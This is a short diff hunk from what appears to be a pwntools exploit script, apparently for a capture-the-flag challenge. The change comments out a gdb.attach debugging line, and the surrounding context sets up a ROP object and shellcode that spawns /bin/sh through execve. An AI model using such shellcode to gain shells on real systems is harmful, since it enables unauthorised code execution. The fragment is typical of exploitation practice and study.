@@ -6,7 +6,7 @@ r = ROP(e)
 
 context.arch = "amd64"
 #context.log_level = 'debug'
-gdb.attach(p)
+#gdb.attach(p)
 
 shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))
 
